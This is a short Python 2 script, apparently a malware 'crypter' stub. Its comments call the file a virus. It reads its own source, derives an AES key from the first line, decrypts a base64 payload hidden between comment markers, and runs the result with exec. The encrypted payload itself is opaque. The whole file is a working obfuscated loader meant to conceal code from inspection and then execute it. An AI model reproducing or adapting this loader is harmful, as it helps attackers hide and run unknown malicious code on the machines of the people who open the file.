print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"
print "bohohoo"
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#fhEFXY6QC8IiFa7RyMar9jCv57TrF1R6W3JrfK2BMADWCRFOiGVMZCdcKEMxXDzVfWf604O+kxVlB+OrLx2le61+eDcRZ2lUr+xTT6CabHpWUWicEiwEss4yCLsjGxpdDST/I2orjnjZw1gmpBqW2oGIukqPabIufIzSFyQros7Ug4U3WqhSYcawwXjKBJcLam5+pHviz4tkubbl4HJmaACDHUv4yfsuOIf4/+SrpI2icg6vz5ikpPtVAzNpUslW8uP3PDQkZRxcpQl8hVrtIMrhU3tNp88ECL6Le1CzZNKZMQI+ywDePgW/a94uGbLZTikIXxKIw57oGs2EtDzdaT37rfpd9zXnHCQvA5cRxqXkIxaeWV4vNO3oZMWs7DD4grWf37NmxQ7Rlz3zVSe7U8btSMlo/kCVlasIr4o59GXB63iVr0WV7X4eagBSHXGf8nGdCAANBULXaP+I6cQnWfC38r2G/9RTHbiia1dWTpVtytExbvH/zCVbN2kUp2oP5HwEWsc/su67S9XzyJLeUh+qDRI1KS5rYP8vvJisCr21mLv/H67X1mO7O5yJgME6YDjyCyPb41/uL8FsewZiWYtW0asyPDA7vyA2Fkv7jmierBT0olk52GtLsnzVCTY2SjixFjC+NjNSlurlt6/oWN6iSBivpgDSJfyRmlHcuaf59+PNm6wgwrBb72+e6B8e5WmATpwjsUBviz1gj4FCdylNQ9ppe3J3du7qcrXkeOhiyYV2oWXRezv0n+8OPMxZkoJaAsg6moq7Le76PRBKwh1WZAuUpo/Z/umu+9HKuO4xugh6rzTXdU3GIcXjkHqt59qis8YHC5MNJgGBj53wf+3t7N7sznmsPBJVRYa0EBN+KcS3amq+rPp/dNqpyDp7p8BhJQie6wGuAcrwX3ocGo21IL7gkRdrpeyNPgA3LD1KoILa8sYu5eWTeDysRXZTwDfo38P/aiTQCGqmtf9Tlr9yvWNheIjI3PkSgj1WsKXUNjtHmjsN61DFgcPJsv34LOSvwJE7pYxk1LirlThEBhdBeM/99YIbtRio0qDDjHlT0IOYqE+3faI4LXDkns6K8PtSYpS//Z6KuHu0pOp8/qEjryGzT8GegU6TPelKD8wiQg5g9aEPR+n5X/QdTFx52wX/qENQQpnozCxStcdPBTheDFJ2hOjcF7T9fbxVnxnfZAMEQ+CGeLTlLbHWdDrgxHzfbC1s82Pc+90RCHmzdQB/OF8d8TEzr2E9X0Gi+co3RWwqiGt0aNguXqQLcCiG+eo4uI0ln45HVBvfARl25ibDdBLjs1oJzxNyW10+HhGTghdU97gTZ3W4jluEV5Jw34tddAOMPy71i05XUEagIFZSn26Iwq/CnA326Xb3t5Hg1PxRW8sXXwuPlNtaaZXCh9ZgR5hqE/HwAzhlZ/YqCpUYGGf39HtLUvtrzXVxuxR2bFOZy7NqpxiOPq/asMTYm+oIgDlWKe85md5W2CTLk/VrpOewggKt5kkUZpainajxHBuwR32tQmsQDQRULsHENU1jpPXef6myb8HhvO0ii1499vT6iGacZTzjK3WVnz2CAM4lzUDrAzbipqxKJcN1gSZSySs87Va5Z5ZuIM2tFoK/AFydcCTNrHLmEVCwvIzwQY6gr6/V6vZ+nlhXzzraKgY/u4KCJKHh2sp4CdvPf213FzyK0YdmIfg02JDVipnAL+n/GEcod8omlf22Wc9dJlGGDyjyISZj/mq0UYHiKF5qPL7hGSYkGyhIkEouV3l2CUL5smNatZWPxBvUGXJ8X0aOV38A0OJf8j7vFfSK3RLfw9LtZRHQsvcIMUetEuIl/A0KQVAJg8MYqg7iJjnBUmAMzOTswe6VcMF66m55i1zIleXYNWUkvNmQ2MwamrssLKuHf6pyYb6wOqSNvTrznKy6tiMOafZ3WW86hB7HnG1ZMtsoRKrW4opJG+awpSmhGHwRTnG9I0mBI6kOVrbK9rzKKLug+FSclh7tmVh2nX4QfjlIdj8YjXuwMrbjecfcXsTF385KHI5pX4lTHB4xBXIFhZubimJsIP9CyKAXiNhOMneVkI6w7hpRByIsQCdfjaIgFCNHzAJdHWK5jVw617lVwqxg7hbHKUkHaCQB3J+FWa89uMShfDXpfFNit43FrMXqVt5jQN8Gy0lDAP5Ly6/9McO1vZZVHxBEBexL83fGAOyz7X5V0ibe8HrXBH0rUBqmq0hvISZQFOvsyCgvG2f7RVHQMGPdv47pCQFtFIEIxCYsDYywIo4A1iqsIUKL3sg57r6yEhXExAOVz6wck/+z9uHGN2LhIWzGYHjRd6NyXiUSLBUlxi9ToN2BQpmeCX3+NlqjCOKkdKtu9yGMAszwLNb04ZoRtjUNnvBYVm2fFoJvz9gM5ci/92YbeAwVt9XC4MNiwpqkOQeElBiS2fhB5GRcReL+iEhOFDzJWMTUggZbyopK5fZOPiJC1awZ6XMbksneB8tcYLX8m8xTM10y178P/7u76BO9B6ssKdqK8vidnjckSUrF49jpt+0krxqBiqVaRiR+Tl2J2NNi3hmiwS90Y1wvpARgrVienrDmrp47f/vB/kOZ3QpeHDLqHpS0fz/3J5grxNohZbh24ubblnxfTcx9lh0eJ6l6GknLoTgoJIQOdhaFMKR8JUs+xzrdM4OxMMbEHOXNQr7VW1Imac9iDieWoy0ATSJghRtDk8M240qovzYGJ7ncQ4cDlsF/MYjRc2jP
#End payload